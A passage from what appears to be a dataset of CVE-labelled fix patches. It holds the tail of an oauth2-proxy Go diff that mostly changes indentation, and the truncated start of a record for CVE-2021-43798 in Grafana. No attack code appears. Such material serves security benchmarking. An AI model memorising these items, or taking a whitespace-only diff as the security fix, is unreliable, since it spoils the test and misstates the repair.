err.Error())\n+                return\n+        }\n+        redirectURI := p.getOAuthRedirectURI(req)\n+        http.Redirect(rw, req, p.provider.GetLoginURL(redirectURI, fmt.Sprintf(\"%v:%v\", nonce, redirect)), http.StatusFound)\n }\n \n // OAuthCallback is the OAuth2 authentication flow callback that finishes the\n // OAuth2 authentication flow\n func (p *OAuthProxy) OAuthCallback(rw http.ResponseWriter, req *http.Request) {\n-\tremoteAddr := ip.GetClientString(p.realClientIPParser, req, true)\n-\n-\t// finish the oauth cycle\n-\terr := req.ParseForm()\n-\tif err != nil {\n-\t\tlogger.Errorf(\"Error while parsing OAuth2 callback: %v\", err)\n-\t\tp.ErrorPage(rw, http.StatusInternalServerError, \"Internal Server Error\", err.Error())\n-\t\treturn\n-\t}\n-\terrorString := req.Form.Get(\"error\")\n-\tif errorString != \"\" {\n-\t\tlogger.Errorf(\"Error while parsing OAuth2 callback: %s\", errorString)\n-\t\tp.ErrorPage(rw, http.StatusForbidden, \"Permission Denied\", errorString)\n-\t\treturn\n-\t}\n-\n-\tsession, err := p.redeemCode(req)\n-\tif err != nil {\n-\t\tlogger.Errorf(\"Error redeeming code during OAuth2 callback: %v\", err)\n-\t\tp.ErrorPage(rw, http.StatusInternalServerError, \"Internal Server Error\", \"Internal Error\")\n-\t\treturn\n-\t}\n-\n-\terr = p.enrichSessionState(req.Context(), session)\n-\tif err != nil {\n-\t\tlogger.Errorf(\"Error creating session during OAuth2 callback: %v\", err)\n-\t\tp.ErrorPage(rw, http.StatusInternalServerError, \"Internal Server Error\", \"Internal Error\")\n-\t\treturn\n-\t}\n-\n-\tstate := strings.SplitN(req.Form.Get(\"state\"), \":\", 2)\n-\tif len(state) != 2 {\n-\t\tlogger.Error(\"Error while parsing OAuth2 state: invalid length\")\n-\t\tp.ErrorPage(rw, http.StatusInternalServerError, \"Internal Server Error\", \"Invalid State\")\n-\t\treturn\n-\t}\n-\tnonce := state[0]\n-\tredirect := state[1]\n-\tc, err := req.Cookie(p.CSRFCookieName)\n-\tif err != nil {\n-\t\tlogger.PrintAuthf(session.Email, req, logger.AuthFailure, \"Invalid authentication via OAuth2: unable to obtain CSRF cookie\")\n-\t\tp.ErrorPage(rw, http.StatusForbidden, \"Permission Denied\", err.Error())\n-\t\treturn\n-\t}\n-\tp.ClearCSRFCookie(rw, req)\n-\tif c.Value != nonce {\n-\t\tlogger.PrintAuthf(session.Email, req, logger.AuthFailure, \"Invalid authentication via OAuth2: CSRF token mismatch, potential attack\")\n-\t\tp.ErrorPage(rw, http.StatusForbidden, \"Permission Denied\", \"CSRF Failed\")\n-\t\treturn\n-\t}\n-\n-\tif !p.IsValidRedirect(redirect) {\n-\t\tredirect = \"/\"\n-\t}\n-\n-\t// set cookie, or deny\n-\tauthorized, err := p.provider.Authorize(req.Context(), session)\n-\tif err != nil {\n-\t\tlogger.Errorf(\"Error with authorization: %v\", err)\n-\t}\n-\tif p.Validator(session.Email) && authorized {\n-\t\tlogger.PrintAuthf(session.Email, req, logger.AuthSuccess, \"Authenticated via OAuth2: %s\", session)\n-\t\terr := p.SaveSession(rw, req, session)\n-\t\tif err != nil {\n-\t\t\tlogger.Errorf(\"Error saving session state for %s: %v\", remoteAddr, err)\n-\t\t\tp.ErrorPage(rw, http.StatusInternalServerError, \"Internal Server Error\", err.Error())\n-\t\t\treturn\n-\t\t}\n-\t\thttp.Redirect(rw, req, redirect, http.StatusFound)\n-\t} else {\n-\t\tlogger.PrintAuthf(session.Email, req, logger.AuthFailure, \"Invalid authentication via OAuth2: unauthorized\")\n-\t\tp.ErrorPage(rw, http.StatusForbidden, \"Permission Denied\", \"Invalid Account\")\n-\t}\n+        remoteAddr := ip.GetClientString(p.realClientIPParser, req, true)\n+\n+        // finish the oauth cycle\n+        err := req.ParseForm()\n+        if err != nil {\n+                logger.Errorf(\"Error while parsing OAuth2 callback: %v\", err)\n+                p.ErrorPage(rw, http.StatusInternalServerError, \"Internal Server Error\", err.Error())\n+                return\n+        }\n+        errorString := req.Form.Get(\"error\")\n+        if errorString != \"\" {\n+                logger.Errorf(\"Error while parsing OAuth2 callback: %s\", errorString)\n+                p.ErrorPage(rw, http.StatusForbidden, \"Permission Denied\", errorString)\n+                return\n+        }\n+\n+        session, err := p.redeemCode(req)\n+        if err != nil {\n+                logger.Errorf(\"Error redeeming code during OAuth2 callback: %v\", err)\n+                p.ErrorPage(rw, http.StatusInternalServerError, \"Internal Server Error\", \"Internal Error\")\n+                return\n+        }\n+\n+        err = p.enrichSessionState(req.Context(), session)\n+        if err != nil {\n+                logger.Errorf(\"Error creating session during OAuth2 callback: %v\", err)\n+                p.ErrorPage(rw, http.StatusInternalServerError, \"Internal Server Error\", \"Internal Error\")\n+                return\n+        }\n+\n+        state := strings.SplitN(req.Form.Get(\"state\"), \":\", 2)\n+        if len(state) != 2 {\n+                logger.Error(\"Error while parsing OAuth2 state: invalid length\")\n+                p.ErrorPage(rw, http.StatusInternalServerError, \"Internal Server Error\", \"Invalid State\")\n+                return\n+        }\n+        nonce := state[0]\n+        redirect := state[1]\n+        c, err := req.Cookie(p.CSRFCookieName)\n+        if err != nil {\n+                logger.PrintAuthf(session.Email, req, logger.AuthFailure, \"Invalid authentication via OAuth2: unable to obtain CSRF cookie\")\n+                p.ErrorPage(rw, http.StatusForbidden, \"Permission Denied\", err.Error())\n+                return\n+        }\n+        p.ClearCSRFCookie(rw, req)\n+        if c.Value != nonce {\n+                logger.PrintAuthf(session.Email, req, logger.AuthFailure, \"Invalid authentication via OAuth2: CSRF token mismatch, potential attack\")\n+                p.ErrorPage(rw, http.StatusForbidden, \"Permission Denied\", \"CSRF Failed\")\n+                return\n+        }\n+\n+        if !p.IsValidRedirect(redirect) {\n+                redirect = \"/\"\n+        }\n+\n+        // set cookie, or deny\n+        authorized, err := p.provider.Authorize(req.Context(), session)\n+        if err != nil {\n+                logger.Errorf(\"Error with authorization: %v\", err)\n+        }\n+        if p.Validator(session.Email) && authorized {\n+                logger.PrintAuthf(session.Email, req, logger.AuthSuccess, \"Authenticated via OAuth2: %s\", session)\n+                err := p.SaveSession(rw, req, session)\n+                if err != nil {\n+                        logger.Errorf(\"Error saving session state for %s: %v\", remoteAddr, err)\n+                        p.ErrorPage(rw, http.StatusInternalServerError, \"Internal Server Error\", err.Error())\n+                        return\n+                }\n+                http.Redirect(rw, req, redirect, http.StatusFound)\n+        } else {\n+                logger.PrintAuthf(session.Email, req, logger.AuthFailure, \"Invalid authentication via OAuth2: unauthorized\")\n+                p.ErrorPage(rw, http.StatusForbidden, \"Permission Denied\", \"Invalid Account\")\n+        }\n }\n \n func (p *OAuthProxy) redeemCode(req *http.Request) (*sessionsapi.SessionState, error) {\n-\tcode := req.Form.Get(\"code\")\n-\tif code == \"\" {\n-\t\treturn nil, providers.ErrMissingCode\n-\t}\n-\n-\tredirectURI := p.getOAuthRedirectURI(req)\n-\ts, err := p.provider.Redeem(req.Context(), redirectURI, code)\n-\tif err != nil {\n-\t\treturn nil, err\n-\t}\n-\treturn s, nil\n+        code := req.Form.Get(\"code\")\n+        if code == \"\" {\n+                return nil, providers.ErrMissingCode\n+        }\n+\n+        redirectURI := p.getOAuthRedirectURI(req)\n+        s, err := p.provider.Redeem(req.Context(), redirectURI, code)\n+        if err != nil {\n+                return nil, err\n+        }\n+        return s, nil\n }\n \n func (p *OAuthProxy) enrichSessionState(ctx context.Context, s *sessionsapi.SessionState) error {\n-\tvar err error\n-\tif s.Email == \"\" {\n-\t\ts.Email, err = p.provider.GetEmailAddress(ctx, s)\n-\t\tif err != nil && !errors.Is(err, providers.ErrNotImplemented) {\n-\t\t\treturn err\n-\t\t}\n-\t}\n-\n-\treturn p.provider.EnrichSession(ctx, s)\n+        var err error\n+        if s.Email == \"\" {\n+                s.Email, err = p.provider.GetEmailAddress(ctx, s)\n+                if err != nil && !errors.Is(err, providers.ErrNotImplemented) {\n+                        return err\n+                }\n+        }\n+\n+        return p.provider.EnrichSession(ctx, s)\n }\n \n // AuthOnly checks whether the user is currently logged in (both authentication\n // and optional authorization).\n func (p *OAuthProxy) AuthOnly(rw http.ResponseWriter, req *http.Request) {\n-\tsession, err := p.getAuthenticatedSession(rw, req)\n-\tif err != nil {\n-\t\thttp.Error(rw, http.StatusText(http.StatusUnauthorized), http.StatusUnauthorized)\n-\t\treturn\n-\t}\n-\n-\t// Unauthorized cases need to return 403 to prevent infinite redirects with\n-\t// subrequest architectures\n-\tif !authOnlyAuthorize(req, session) {\n-\t\thttp.Error(rw, http.StatusText(http.StatusForbidden), http.StatusForbidden)\n-\t\treturn\n-\t}\n-\n-\t// we are authenticated\n-\tp.addHeadersForProxying(rw, session)\n-\tp.headersChain.Then(http.HandlerFunc(func(rw http.ResponseWriter, req *http.Request) {\n-\t\trw.WriteHeader(http.StatusAccepted)\n-\t})).ServeHTTP(rw, req)\n+        session, err := p.getAuthenticatedSession(rw, req)\n+        if err != nil {\n+                http.Error(rw, http.StatusText(http.StatusUnauthorized), http.StatusUnauthorized)\n+                return\n+        }\n+\n+        // Unauthorized cases need to return 403 to prevent infinite redirects with\n+        // subrequest architectures\n+        if !authOnlyAuthorize(req, session) {\n+                http.Error(rw, http.StatusText(http.StatusForbidden), http.StatusForbidden)\n+                return\n+        }\n+\n+        // we are authenticated\n+        p.addHeadersForProxying(rw, session)\n+        p.headersChain.Then(http.HandlerFunc(func(rw http.ResponseWriter, req *http.Request) {\n+                rw.WriteHeader(http.StatusAccepted)\n+        })).ServeHTTP(rw, req)\n }\n \n // SkipAuthProxy proxies allowlisted requests and skips authentication\n func (p *OAuthProxy) SkipAuthProxy(rw http.ResponseWriter, req *http.Request) {\n-\tp.headersChain.Then(p.serveMux).ServeHTTP(rw, req)\n+        p.headersChain.Then(p.serveMux).ServeHTTP(rw, req)\n }\n \n // Proxy proxies the user request if the user is authenticated else it prompts\n // them to authenticate\n func (p *OAuthProxy) Proxy(rw http.ResponseWriter, req *http.Request) {\n-\tsession, err := p.getAuthenticatedSession(rw, req)\n-\tswitch err {\n-\tcase nil:\n-\t\t// we are authenticated\n-\t\tp.addHeadersForProxying(rw, session)\n-\t\tp.headersChain.Then(p.serveMux).ServeHTTP(rw, req)\n-\tcase ErrNeedsLogin:\n-\t\t// we need to send the user to a login screen\n-\t\tif isAjax(req) {\n-\t\t\t// no point redirecting an AJAX request\n-\t\t\tp.errorJSON(rw, http.StatusUnauthorized)\n-\t\t\treturn\n-\t\t}\n-\n-\t\tif p.SkipProviderButton {\n-\t\t\tp.OAuthStart(rw, req)\n-\t\t} else {\n-\t\t\tp.SignInPage(rw, req, http.StatusForbidden)\n-\t\t}\n-\n-\tcase ErrAccessDenied:\n-\t\tp.ErrorPage(rw, http.StatusUnauthorized, \"Permission Denied\", \"Unauthorized\")\n-\n-\tdefault:\n-\t\t// unknown error\n-\t\tlogger.Errorf(\"Unexpected internal error: %v\", err)\n-\t\tp.ErrorPage(rw, http.StatusInternalServerError,\n-\t\t\t\"Internal Error\", \"Internal Error\")\n-\t}\n+        session, err := p.getAuthenticatedSession(rw, req)\n+        switch err {\n+        case nil:\n+                // we are authenticated\n+                p.addHeadersForProxying(rw, session)\n+                p.headersChain.Then(p.serveMux).ServeHTTP(rw, req)\n+        case ErrNeedsLogin:\n+                // we need to send the user to a login screen\n+                if isAjax(req) {\n+                        // no point redirecting an AJAX request\n+                        p.errorJSON(rw, http.StatusUnauthorized)\n+                        return\n+                }\n+\n+                if p.SkipProviderButton {\n+                        p.OAuthStart(rw, req)\n+                } else {\n+                        p.SignInPage(rw, req, http.StatusForbidden)\n+                }\n+\n+        case ErrAccessDenied:\n+                p.ErrorPage(rw, http.StatusUnauthorized, \"Permission Denied\", \"Unauthorized\")\n+\n+        default:\n+                // unknown error\n+                logger.Errorf(\"Unexpected internal error: %v\", err)\n+                p.ErrorPage(rw, http.StatusInternalServerError,\n+                        \"Internal Error\", \"Internal Error\")\n+        }\n }\n \n // See https://developers.google.com/web/fundamentals/performance/optimizing-content-efficiency/http-caching?hl=en\n var noCacheHeaders = map[string]string{\n-\t\"Expires\":         time.Unix(0, 0).Format(time.RFC1123),\n-\t\"Cache-Control\":   \"no-cache, no-store, must-revalidate, max-age=0\",\n-\t\"X-Accel-Expires\": \"0\", // https://www.nginx.com/resources/wiki/start/topics/examples/x-accel/\n+        \"Expires\":         time.Unix(0, 0).Format(time.RFC1123),\n+        \"Cache-Control\":   \"no-cache, no-store, must-revalidate, max-age=0\",\n+        \"X-Accel-Expires\": \"0\", // https://www.nginx.com/resources/wiki/start/topics/examples/x-accel/\n }\n \n // prepareNoCache prepares headers for preventing browser caching.\n func prepareNoCache(w http.ResponseWriter) {\n-\t// Set NoCache headers\n-\tfor k, v := range noCacheHeaders {\n-\t\tw.Header().Set(k, v)\n-\t}\n+        // Set NoCache headers\n+        for k, v := range noCacheHeaders {\n+                w.Header().Set(k, v)\n+        }\n }\n \n // getOAuthRedirectURI returns the redirectURL that the upstream OAuth Provider will\n // redirect clients to once authenticated.\n // This is usually the OAuthProxy callback URL.\n func (p *OAuthProxy) getOAuthRedirectURI(req *http.Request) string {\n-\t// if `p.redirectURL` already has a host, return it\n-\tif p.redirectURL.Host != \"\" {\n-\t\treturn p.redirectURL.String()\n-\t}\n-\n-\t// Otherwise figure out the scheme + host from the request\n-\trd := *p.redirectURL\n-\trd.Host = requestutil.GetRequestHost(req)\n-\trd.Scheme = requestutil.GetRequestProto(req)\n-\n-\t// If CookieSecure is true, return `https` no matter what\n-\t// Not all reverse proxies set X-Forwarded-Proto\n-\tif p.CookieSecure {\n-\t\trd.Scheme = schemeHTTPS\n-\t}\n-\treturn rd.String()\n+        // if `p.redirectURL` already has a host, return it\n+        if p.redirectURL.Host != \"\" {\n+                return p.redirectURL.String()\n+        }\n+\n+        // Otherwise figure out the scheme + host from the request\n+        rd := *p.redirectURL\n+        rd.Host = requestutil.GetRequestHost(req)\n+        rd.Scheme = requestutil.GetRequestProto(req)\n+\n+        // If CookieSecure is true, return `https` no matter what\n+        // Not all reverse proxies set X-Forwarded-Proto\n+        if p.CookieSecure {\n+                rd.Scheme = schemeHTTPS\n+        }\n+        return rd.String()\n }\n \n // getAppRedirect determines the full URL or URI path to redirect clients to\n@@ -941,89 +941,89 @@ func (p *OAuthProxy) getOAuthRedirectURI(req *http.Request) string {\n // - `req.URL.RequestURI` if not under the ProxyPath (i.e. /oauth2/*)\n // - `/`\n func (p *OAuthProxy) getAppRedirect(req *http.Request) (string, error) {\n-\terr := req.ParseForm()\n-\tif err != nil {\n-\t\treturn \"\", err\n-\t}\n-\n-\t// These redirect getter functions are strategies ordered by priority\n-\t// for figuring out the redirect URL.\n-\ttype redirectGetter func(req *http.Request) string\n-\tfor _, rdGetter := range []redirectGetter{\n-\t\tp.getRdQuerystringRedirect,\n-\t\tp.getXAuthRequestRedirect,\n-\t\tp.getXForwardedHeadersRedirect,\n-\t\tp.getURIRedirect,\n-\t} {\n-\t\tredirect := rdGetter(req)\n-\t\t// Call `p.IsValidRedirect` again here a final time to be safe\n-\t\tif redirect != \"\" && p.IsValidRedirect(redirect) {\n-\t\t\treturn redirect, nil\n-\t\t}\n-\t}\n-\n-\treturn \"/\", nil\n+        err := req.ParseForm()\n+        if err != nil {\n+                return \"\", err\n+        }\n+\n+        // These redirect getter functions are strategies ordered by priority\n+        // for figuring out the redirect URL.\n+        type redirectGetter func(req *http.Request) string\n+        for _, rdGetter := range []redirectGetter{\n+                p.getRdQuerystringRedirect,\n+                p.getXAuthRequestRedirect,\n+                p.getXForwardedHeadersRedirect,\n+                p.getURIRedirect,\n+        } {\n+                redirect := rdGetter(req)\n+                // Call `p.IsValidRedirect` again here a final time to be safe\n+                if redirect != \"\" && p.IsValidRedirect(redirect) {\n+                        return redirect, nil\n+                }\n+        }\n+\n+        return \"/\", nil\n }\n \n func isForwardedRequest(req *http.Request) bool {\n-\treturn requestutil.IsProxied(req) &&\n-\t\treq.Host != requestutil.GetRequestHost(req)\n+        return requestutil.IsProxied(req) &&\n+                req.Host != requestutil.GetRequestHost(req)\n }\n \n func (p *OAuthProxy) hasProxyPrefix(path string) bool {\n-\treturn strings.HasPrefix(path, fmt.Sprintf(\"%s/\", p.ProxyPrefix))\n+        return strings.HasPrefix(path, fmt.Sprintf(\"%s/\", p.ProxyPrefix))\n }\n \n func (p *OAuthProxy) validateRedirect(redirect string, errorFormat string) string {\n-\tif p.IsValidRedirect(redirect) {\n-\t\treturn redirect\n-\t}\n-\tif redirect != \"\" {\n-\t\tlogger.Errorf(errorFormat, redirect)\n-\t}\n-\treturn \"\"\n+        if p.IsValidRedirect(redirect) {\n+                return redirect\n+        }\n+        if redirect != \"\" {\n+                logger.Errorf(errorFormat, redirect)\n+        }\n+        return \"\"\n }\n \n // getRdQuerystringRedirect handles this getAppRedirect strategy:\n // - `rd` querysting parameter\n func (p *OAuthProxy) getRdQuerystringRedirect(req *http.Request) string {\n-\treturn p.validateRedirect(\n-\t\treq.Form.Get(\"rd\"),\n-\t\t\"Invalid redirect provided in rd querystring parameter: %s\",\n-\t)\n+        return p.validateRedirect(\n+                req.Form.Get(\"rd\"),\n+                \"Invalid redirect provided in rd querystring parameter: %s\",\n+        )\n }\n \n // getXAuthRequestRedirect handles this getAppRedirect strategy:\n // - `X-Auth-Request-Redirect` Header\n func (p *OAuthProxy) getXAuthRequestRedirect(req *http.Request) string {\n-\treturn p.validateRedirect(\n-\t\treq.Header.Get(\"X-Auth-Request-Redirect\"),\n-\t\t\"Invalid redirect provided in X-Auth-Request-Redirect header: %s\",\n-\t)\n+        return p.validateRedirect(\n+                req.Header.Get(\"X-Auth-Request-Redirect\"),\n+                \"Invalid redirect provided in X-Auth-Request-Redirect header: %s\",\n+        )\n }\n \n // getXForwardedHeadersRedirect handles these getAppRedirect strategies:\n // - `X-Forwarded-(Proto|Host|Uri)` headers (when ReverseProxy mode is enabled)\n // - `X-Forwarded-(Proto|Host)` if `Uri` has the ProxyPath (i.e. /oauth2/*)\n func (p *OAuthProxy) getXForwardedHeadersRedirect(req *http.Request) string {\n-\tif !isForwardedRequest(req) {\n-\t\treturn \"\"\n-\t}\n-\n-\turi := requestutil.GetRequestURI(req)\n-\tif p.hasProxyPrefix(uri) {\n-\t\turi = \"/\"\n-\t}\n-\n-\tredirect := fmt.Sprintf(\n-\t\t\"%s://%s%s\",\n-\t\trequestutil.GetRequestProto(req),\n-\t\trequestutil.GetRequestHost(req),\n-\t\turi,\n-\t)\n-\n-\treturn p.validateRedirect(redirect,\n-\t\t\"Invalid redirect generated from X-Forwarded-* headers: %s\")\n+        if !isForwardedRequest(req) {\n+                return \"\"\n+        }\n+\n+        uri := requestutil.GetRequestURI(req)\n+        if p.hasProxyPrefix(uri) {\n+                uri = \"/\"\n+        }\n+\n+        redirect := fmt.Sprintf(\n+                \"%s://%s%s\",\n+                requestutil.GetRequestProto(req),\n+                requestutil.GetRequestHost(req),\n+                uri,\n+        )\n+\n+        return p.validateRedirect(redirect,\n+                \"Invalid redirect generated from X-Forwarded-* headers: %s\")\n }\n \n // getURIRedirect handles these getAppRedirect strategies:\n@@ -1031,18 +1031,18 @@ func (p *OAuthProxy) getXForwardedHeadersRedirect(req *http.Request) string {\n // - `req.URL.RequestURI` if not under the ProxyPath (i.e. /oauth2/*)\n // - `/`\n func (p *OAuthProxy) getURIRedirect(req *http.Request) string {\n-\tredirect := p.validateRedirect(\n-\t\trequestutil.GetRequestURI(req),\n-\t\t\"Invalid redirect generated from X-Forwarded-Uri header: %s\",\n-\t)\n-\tif redirect == \"\" {\n-\t\tredirect = req.URL.RequestURI()\n-\t}\n-\n-\tif p.hasProxyPrefix(redirect) {\n-\t\treturn \"/\"\n-\t}\n-\treturn redirect\n+        redirect := p.validateRedirect(\n+                requestutil.GetRequestURI(req),\n+                \"Invalid redirect generated from X-Forwarded-Uri header: %s\",\n+        )\n+        if redirect == \"\" {\n+                redirect = req.URL.RequestURI()\n+        }\n+\n+        if p.hasProxyPrefix(redirect) {\n+                return \"/\"\n+        }\n+        return redirect\n }\n \n // splitHostPort separates host and port. If the port is not valid, it returns\n@@ -1050,36 +1050,36 @@ func (p *OAuthProxy) getURIRedirect(req *http.Request) string {\n // Unlike net.SplitHostPort, but per RFC 3986, it requires ports to be numeric.\n // *** taken from net/url, modified validOptionalPort() to accept \":*\"\n func splitHostPort(hostport string) (host, port string) {\n-\thost = hostport\n+        host = hostport\n \n-\tcolon := strings.LastIndexByte(host, ':')\n-\tif colon != -1 && validOptionalPort(host[colon:]) {\n-\t\thost, port = host[:colon], host[colon+1:]\n-\t}\n+        colon := strings.LastIndexByte(host, ':')\n+        if colon != -1 && validOptionalPort(host[colon:]) {\n+                host, port = host[:colon], host[colon+1:]\n+        }\n \n-\tif strings.HasPrefix(host, \"[\") && strings.HasSuffix(host, \"]\") {\n-\t\thost = host[1 : len(host)-1]\n-\t}\n+        if strings.HasPrefix(host, \"[\") && strings.HasSuffix(host, \"]\") {\n+                host = host[1 : len(host)-1]\n+        }\n \n-\treturn\n+        return\n }\n \n // validOptionalPort reports whether port is either an empty string\n // or matches /^:\\d*$/\n // *** taken from net/url, modified to accept \":*\"\n func validOptionalPort(port string) bool {\n-\tif port == \"\" || port == \":*\" {\n-\t\treturn true\n-\t}\n-\tif port[0] != ':' {\n-\t\treturn false\n-\t}\n-\tfor _, b := range port[1:] {\n-\t\tif b < '0' || b > '9' {\n-\t\t\treturn false\n-\t\t}\n-\t}\n-\treturn true\n+        if port == \"\" || port == \":*\" {\n+                return true\n+        }\n+        if port[0] != ':' {\n+                return false\n+        }\n+        for _, b := range port[1:] {\n+                if b < '0' || b > '9' {\n+                        return false\n+                }\n+        }\n+        return true\n }\n \n // getAuthenticatedSession checks whether a user is authenticated and returns a session object and nil error if so\n@@ -1088,34 +1088,34 @@ func validOptionalPort(port string) bool {\n // - `nil, ErrAccessDenied` if the authenticated user is not authorized\n // Set-Cookie headers may be set on the response as a side-effect of calling this method.\n func (p *OAuthProxy) getAuthenticatedSession(rw http.ResponseWriter, req *http.Request) (*sessionsapi.SessionState, error) {\n-\tvar session *sessionsapi.SessionState\n-\n-\tgetSession := p.sessionChain.Then(http.HandlerFunc(func(rw http.ResponseWriter, req *http.Request) {\n-\t\tsession = middlewareapi.GetRequestScope(req).Session\n-\t}))\n-\tgetSession.ServeHTTP(rw, req)\n-\n-\tif session == nil {\n-\t\treturn nil, ErrNeedsLogin\n-\t}\n-\n-\tinvalidEmail := session.Email != \"\" && !p.Validator(session.Email)\n-\tauthorized, err := p.provider.Authorize(req.Context(), session)\n-\tif err != nil {\n-\t\tlogger.Errorf(\"Error with authorization: %v\", err)\n-\t}\n-\n-\tif invalidEmail || !authorized {\n-\t\tlogger.PrintAuthf(session.Email, req, logger.AuthFailure, \"Invalid authorization via session: removing session %s\", session)\n-\t\t// Invalid session, clear it\n-\t\terr := p.ClearSessionCookie(rw, req)\n-\t\tif err != nil {\n-\t\t\tlogger.Errorf(\"Error clearing session cookie: %v\", err)\n-\t\t}\n-\t\treturn nil, ErrAccessDenied\n-\t}\n-\n-\treturn session, nil\n+        var session *sessionsapi.SessionState\n+\n+        getSession := p.sessionChain.Then(http.HandlerFunc(func(rw http.ResponseWriter, req *http.Request) {\n+                session = middlewareapi.GetRequestScope(req).Session\n+        }))\n+        getSession.ServeHTTP(rw, req)\n+\n+        if session == nil {\n+                return nil, ErrNeedsLogin\n+        }\n+\n+        invalidEmail := session.Email != \"\" && !p.Validator(session.Email)\n+        authorized, err := p.provider.Authorize(req.Context(), session)\n+        if err != nil {\n+                logger.Errorf(\"Error with authorization: %v\", err)\n+        }\n+\n+        if invalidEmail || !authorized {\n+                logger.PrintAuthf(session.Email, req, logger.AuthFailure, \"Invalid authorization via session: removing session %s\", session)\n+                // Invalid session, clear it\n+                err := p.ClearSessionCookie(rw, req)\n+                if err != nil {\n+                        logger.Errorf(\"Error clearing session cookie: %v\", err)\n+                }\n+                return nil, ErrAccessDenied\n+        }\n+\n+        return session, nil\n }\n \n // authOnlyAuthorize handles special authorization logic that is only done\n@@ -1126,76 +1126,76 @@ func (p *OAuthProxy) getAuthenticatedSession(rw http.ResponseWriter, req *http.R\n //\n //nolint:S1008\n func authOnlyAuthorize(req *http.Request, s *sessionsapi.SessionState) bool {\n-\t// Allow secondary group restrictions based on the `allowed_groups`\n-\t// querystring parameter\n-\tif !checkAllowedGroups(req, s) {\n-\t\treturn false\n-\t}\n+        // Allow secondary group restrictions based on the `allowed_groups`\n+        // querystring parameter\n+        if !checkAllowedGroups(req, s) {\n+                return false\n+        }\n \n-\treturn true\n+        return true\n }\n \n func checkAllowedGroups(req *http.Request, s *sessionsapi.SessionState) bool {\n-\tallowedGroups := extractAllowedGroups(req)\n-\tif len(allowedGroups) == 0 {\n-\t\treturn true\n-\t}\n-\n-\tfor _, group := range s.Groups {\n-\t\tif _, ok := allowedGroups[group]; ok {\n-\t\t\treturn true\n-\t\t}\n-\t}\n-\n-\treturn false\n+        allowedGroups := extractAllowedGroups(req)\n+        if len(allowedGroups) == 0 {\n+                return true\n+        }\n+\n+        for _, group := range s.Groups {\n+                if _, ok := allowedGroups[group]; ok {\n+                        return true\n+                }\n+        }\n+\n+        return false\n }\n \n func extractAllowedGroups(req *http.Request) map[string]struct{} {\n-\tgroups := map[string]struct{}{}\n-\n-\tquery := req.URL.Query()\n-\tfor _, allowedGroups := range query[\"allowed_groups\"] {\n-\t\tfor _, group := range strings.Split(allowedGroups, \",\") {\n-\t\t\tif group != \"\" {\n-\t\t\t\tgroups[group] = struct{}{}\n-\t\t\t}\n-\t\t}\n-\t}\n-\n-\treturn groups\n+        groups := map[string]struct{}{}\n+\n+        query := req.URL.Query()\n+        for _, allowedGroups := range query[\"allowed_groups\"] {\n+                for _, group := range strings.Split(allowedGroups, \",\") {\n+                        if group != \"\" {\n+                                groups[group] = struct{}{}\n+                        }\n+                }\n+        }\n+\n+        return groups\n }\n \n // addHeadersForProxying adds the appropriate headers the request / response for proxying\n func (p *OAuthProxy) addHeadersForProxying(rw http.ResponseWriter, session *sessionsapi.SessionState) {\n-\tif session.Email == \"\" {\n-\t\trw.Header().Set(\"GAP-Auth\", session.User)\n-\t} else {\n-\t\trw.Header().Set(\"GAP-Auth\", session.Email)\n-\t}\n+        if session.Email == \"\" {\n+                rw.Header().Set(\"GAP-Auth\", session.User)\n+        } else {\n+                rw.Header().Set(\"GAP-Auth\", session.Email)\n+        }\n }\n \n // isAjax checks if a request is an ajax request\n func isAjax(req *http.Request) bool {\n-\tacceptValues := req.Header.Values(\"Accept\")\n-\tconst ajaxReq = applicationJSON\n-\t// Iterate over multiple Accept headers, i.e.\n-\t// Accept: application/json\n-\t// Accept: text/plain\n-\tfor _, mimeTypes := range acceptValues {\n-\t\t// Iterate over multiple mimetypes in a single header, i.e.\n-\t\t// Accept: application/json, text/plain, */*\n-\t\tfor _, mimeType := range strings.Split(mimeTypes, \",\") {\n-\t\t\tmimeType = strings.TrimSpace(mimeType)\n-\t\t\tif mimeType == ajaxReq {\n-\t\t\t\treturn true\n-\t\t\t}\n-\t\t}\n-\t}\n-\treturn false\n+        acceptValues := req.Header.Values(\"Accept\")\n+        const ajaxReq = applicationJSON\n+        // Iterate over multiple Accept headers, i.e.\n+        // Accept: application/json\n+        // Accept: text/plain\n+        for _, mimeTypes := range acceptValues {\n+                // Iterate over multiple mimetypes in a single header, i.e.\n+                // Accept: application/json, text/plain, */*\n+                for _, mimeType := range strings.Split(mimeTypes, \",\") {\n+                        mimeType = strings.TrimSpace(mimeType)\n+                        if mimeType == ajaxReq {\n+                                return true\n+                        }\n+                }\n+        }\n+        return false\n }\n \n // errorJSON returns the error code with an application/json mime type\n func (p *OAuthProxy) errorJSON(rw http.ResponseWriter, code int) {\n-\trw.Header().Set(\"Content-Type\", applicationJSON)\n-\trw.WriteHeader(code)\n+        rw.Header().Set(\"Content-Type\", applicationJSON)\n+        rw.WriteHeader(code)\n }\n"}
{"cve":"CVE-2021-43798:0708", "fix_patch": "diff --git a/pkg/api/plugins.go b/pkg/api/plugins.go\nindex 6e01a3414fe..43f03e25c61 100644\n--- a/pkg/api/plugins.go\n+++ b/pkg/api/plugins.go\n@@ -1,507 +1,513 @@\n package api\n \n import (\n-\t\"context\"\n-\t\"encoding/json\"\n-\t\"errors\"\n-\t\"fmt\"\n-\t\"io/ioutil\"\n-\t\"net/http\"\n-\t\"os\"\n-\t\"path/filepath\"\n-\t\"sort\"\n-\t\"strings\"\n-\n-\t\"github.com/grafana/grafana-plugin-sdk-go/backend\"\n-\t\"github.com/grafana/grafana/pkg/api/dtos\"\n-\t\"github.com/grafana/grafana/pkg/api/response\"\n-\t\"github.com/grafana/grafana/pkg/bus\"\n-\t\"github.com/grafana/grafana/pkg/infra/fs\"\n-\t\"github.com/grafana/grafana/pkg/models\"\n-\t\"github.com/grafana/grafana/pkg/plugins\"\n-\t\"github.com/grafana/grafana/pkg/plugins/backendplugin\"\n-\t\"github.com/grafana/grafana/pkg/plugins/manager/installer\"\n-\t\"github.com/grafana/grafana/pkg/setting\"\n-\t\"github.com/grafana/grafana/pkg/web\"\n+        \"context\"\n+        \"encoding/json\"\n+        \"errors\"\n+        \"fmt\"\n+        \"io/ioutil\"\n+        \"net/http\"\n+        \"os\"\n+        \"path/filepath\"\n+        \"sort\"\n+        \"strings\"\n+\n+        \"github.com/grafana/grafana-plugin-sdk-go/backend\"\n+        \"github.com/grafana/grafana/pkg/api/dtos\"\n+        \"github.com/grafana/grafana/pkg/api/response\"\n+        \"github.com/grafana/grafana/pkg/bus\"\n+        \"github.com/grafana/grafana/pkg/infra/fs\"\n+        \"github.com/grafana/grafana/pkg/models\"\n+        